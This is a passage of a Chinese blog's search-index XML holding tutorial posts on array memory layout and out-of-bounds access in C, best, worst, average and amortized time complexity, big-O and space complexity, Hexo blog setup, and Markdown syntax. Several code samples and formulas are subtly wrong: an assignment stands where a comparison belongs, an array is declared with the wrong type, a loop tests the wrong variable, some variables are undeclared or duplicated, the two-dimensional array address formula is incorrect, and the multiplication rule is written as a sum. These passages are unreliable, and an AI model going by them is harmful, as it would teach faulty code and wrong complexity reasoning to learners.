如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。 警惕数组越界问题了解数组的几个基本操作后，再来看看数据的访问越界问题。 这里以一段C语言代码为例来进行说明： 123456789int main(int argc, char* argv[])&#123; int i = 0; int arr[3] = &#123;0&#125;; for(i; i&lt;=3; i++)&#123; arr[i] = 0; printf("hello world\n"); &#125; return 0;&#125; 你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？ 我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。 我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。 关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: https://blog.csdn.net/liuhuiyi/article/details/7526889 数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。 所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。 但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。 容器能否完全代替数组?针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？ 以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。 不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。 作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。 1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。 2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。 对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。 解答开篇为什么数组的索引是从0开始，而不是从1开始呢？ 从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可$$ a[k]\_address = base\_address + k * type\_size $$ 但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：$$ a[k]\_address = base\_address + (k-1) * type\_size $$ 对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。 不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。 C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。 思考题1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？ JVM标记清除垃圾回收算法：分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。 该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。 二维数组的寻址公式： 根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：$$ arr[i][j]\_address = base\_address + (i + n*j)*data\_type\_size $$ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-最好、最坏、平均、均摊时间复杂度]]></title>
    <url>%2Fposts%2F2018-09-09-%E7%AE%97%E6%B3%95-%E6%9C%80%E5%A5%BD%E3%80%81%E6%9C%80%E5%9D%8F%E3%80%81%E5%B9%B3%E5%9D%87%E3%80%81%E5%9D%87%E6%91%8A%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.html</url>
    <content type="text"><![CDATA[前言 前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。 这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识： 最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。 最好、最坏时间复杂度 我们先用学过的知识试着分析以下代码的时间复杂度： 1234567891011int findArray(int[] arr, int n, int target)&#123; int i = 0; int pos = -1; for(i; i&lt;n; i++)&#123; if(arr[i] = target)&#123; pos = i; &#125; &#125; return pos;&#125; 上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。 但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码： 123456789101112int findArray(int[] arr, int n, int target)&#123; int i = 0; int pos = -1; for(i; i&lt;n; i++)&#123; if(arr[i] = target)&#123; pos = i; break; &#125; &#125; return pos;&#125; 但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？ 因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。 为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：最好情况时间复杂度、最坏情况复杂度、平均时间复杂度。 顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。 同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。 平均时间复杂度我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：平均情况时间复杂度，简称平均时间复杂度。 平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。 要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即： $$ \frac{1+2+3+…+n+n}{n+1} = \frac{n(n + 3)}{2(n + 1)} $$ 我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。 这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。 我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\frac{1}{2}$。 不在数组中时，时间复杂度为: $n\times\frac{1}{2}$; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:$\frac{1}{2n}$, 因此在数组中时的时间复杂度为：$(1+2+3+…+n)\times\frac{1}{2n} $。 那平均时间复杂度就是：$(1+2+3+…+n)\times\frac{1}{2n} + n\times\frac{1}{2} = \frac{3n+1}{4} = O(n)$。 这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做加权平均时间复杂度或者期望时间复杂度。 实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。 均摊时间复杂度目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：均摊时间复杂度，以及它对应的分析方法摊还分析。 均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。 还是以一个例子来说明(别太在意例子，只是为了说明)： 1234567891011121314151617int[] arr = new int[n];int size = 0；void insert(int val)&#123; // 如果数组满了 if(count == arr.length)&#123; int sum = 0; for(int i=0; i&lt;arr.length;i++)&#123; sum = sum + arr[i]; &#125; arr[0] = sum; count = 1; &#125; // 数组赋值 arr[count] = val; ++count;&#125; 先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。 那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。 最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} +….+ 1\times\frac{1}{n+1} + n\times\frac{1}{n+1} = O(1) $。 我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。 针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：摊还分析法，通过摊还分析得到的时间复杂度我们起了一个名字叫：摊还时间复杂度。 那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？ 我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。 均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。 对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。 思考题：根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。 1234567891011121314151617181920int[] arr = new int[10];int len = 10;int i=0;void add(int element)&#123; // 数组空间满了 if(i&gt;=len)&#123; // 数组扩容 int new_arr = new int[len*2]; // 把数组拷贝到新数组 for(int j=0; i&lt;len; j++)&#123; new_arr[j] = arr[j]; &#125; arr = new_arr; len = len*2; &#125; // 添加到数组中 arr[i] = element; ++i;&#125; 分析：在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。 平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} +….+ 1\times\frac{1}{n+1} + n\times\frac{1}{n+1} = O(1) $。 均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-复杂度分析]]></title>
    <url>%2Fposts%2F2018-09-08-%E7%AE%97%E6%B3%95-%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({}); 前言 我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。 为什么需要复杂度分析 有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？ 1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，是有非常大的局限性。 2、测试结果非常依赖测试环境，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。 3、对于不同的数据集，如果数据的有序程度不一样，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，数据规模的大小也可能对算法产生影响。 因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。 大O复杂度表示法 算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？ 这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现： 1234567int sum(int n)&#123; int sum = 0; for (int i=1; i&lt;=n; i++)&#123; sum += i; &#125; return sum;&#125; 从CPU的角度看，每一行代码都执行着类似的操作：读数据-运算-写数据。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算： 第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \times n \times time $，所以此段代码执行的时间为$ (2n + 1)\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。 按照这个思路，再对以下代码段进行分析： 12345678int sum(int n)&#123; int sum = 0; for(int i=1; i &lt;= n; i++)&#123; for(int j=1; j &lt;= n; j++)&#123; sum += i*j; &#125; &#125;&#125; 假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？ 第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。 尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律： 所有的代码执行时间T(n)与每行代码的执行次数成正比$$ T(n) = O(f(n)) $$ 其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。 所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。 在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $; 时间复杂度分析 前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？ 1、只关注循环次数最多的一段代码在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。 2、加法法则：总复杂度等于量级最大的那段代码的复杂度如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。 注意：当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ 几种常见时间复杂度 1、$O(1)$O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。 2、$ O(logN)、O(N*logN) $对数阶的时间复杂度非常常见，同时也是最难分析的一种。 1234int i = 1;while(i &lt;= n)&#123; i = i * 2;&#125; 在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \&nbsp;&nbsp;&nbsp;&nbsp; 2^1 \&nbsp;&nbsp; 2^2 \&nbsp;&nbsp; 2^3 … 2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\log_2 N) $。 如果把代码改为如下。那时间复杂度是多少呢？ 1234int i = 1;while(i &lt;= n)&#123; i = i * 3;&#125; 根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。 实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？ 我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： 在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。 如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。 2、$ O(m+n)、O(m*n) $我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。 123456789101112int func(int m, int n)&#123; int sum1 = 0; for(int i=1; i&lt;=m; i++)&#123; sum1 += i; &#125; int sum1 = 0; for(int j=1; j&lt;=m; j++)&#123; sum1 += j; &#125; return sum1+sum2;&#125; 从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$， 针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。 空间复杂度 前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。 还是拿具体的例子说明(仅供测试,一般没人这么写) 12345678void func(int n)&#123; int i = 0; int[] a = new int[n]; for(i; i&lt;n; i++)&#123; a[i] = i*1; print(a[i]); &#125;&#125; 和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n). 我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo-安装及配置]]></title>
    <url>%2Fposts%2F2018-09-07-hexo-%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE.html</url>
    <content type="text"><![CDATA[前言曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。 一、预备1、安装Nodejs及npm Nodejs下载地址： 官网下载地址：https://nodejs.org/zh-cn/download/ 2、安装Git Git下载地址： 官网下载地址：https://git-scm.com/download/ 安装完成后，执行如下命令，可以显示版本号就算安装成功了 12345678$ node -vv9.11.1$ npm -v6.3.0$ git --versiongit version 2.17.0.windows.1 二、安装hexo进入命令行，执行如下命令: 1234567891011121、全局安装hexo$ npm install hexo -g2、创建hexo工作目录$ mkdir hexo-blog$ cd hexo-blog3、初始化工作目录$ hexo init4、本地启动hexo$ hexo serve 到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。 当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。 三、hexo配置hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照hexo官网文档进行配置，当然，有兴趣可以参照我的配置 网站配置：12345678# Sitetitle: Aries' blog 网站标题subtitle: 副标题description: 我不生产知识，我只是知识的搬运工。 网站一句话描述keywords: 关键词author: 无名万物 作者language: zh-CN 语言timezone: Asia/Shanghai 时区 文章配置：1234url: http://blog.renhj.org 网站urlroot: / 文章根路径permalink: posts/:year-:month-:day-:title.html 文章urlpermalink_defaults: 四、创建新文章你可以通过以下命令来创建一篇新文章1hexo new [layout] &lt;title&gt; 命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局. 当然也可以新建一个草稿： draft，这种布局在建立时会保存到source/_drafts文件夹，也可以通过publish来将草稿移动到正式文件夹。 12345# 新建草稿文章$ hexo new draft &lt;title&gt;# 将文章正式发布$ hexo publish [layout] &lt;title&gt; Front-matter Front-matter是文章最上方以--- 分割的区域，用于指定个别文件的变量 12345678910---layout: 指定文章的布局属性title： 文章标题data：建立日期updated： 更新日期comments： 是否开启文章的评论功能(如果有的话)tags： 标签categories：分类permalink： 覆盖文章的网址--- 修改美化默认的主题是有点丑，可以去hexo的主题商店 找一个自己喜欢的、漂亮的主题。 本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：hexo nexT主题，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客</tag>
        <tag>nexT</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Markdown来写文章]]></title>
    <url>%2Fposts%2F2018-09-06-%E7%94%A8Markdown%E6%9D%A5%E5%86%99%E6%96%87%E7%AB%A0.html</url>
    <content type="text"><![CDATA[MarkdownMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。 Markdown用一些简单的符号标识不同的标题，将某些文章标记为”粗体“或者斜体，下面就来一起学习一下。 语法1、标题 不同的标题采用不等个数的#号来进行标记，如下所示： 1234# 一级标题## 二级标题### 三级标题#### 四级标题 2、代码块 在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下： ```pyhtonprint (“Hello World!”)``` 3、特殊字符 123**粗体***斜体*&gt; 引用内容 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
</search>
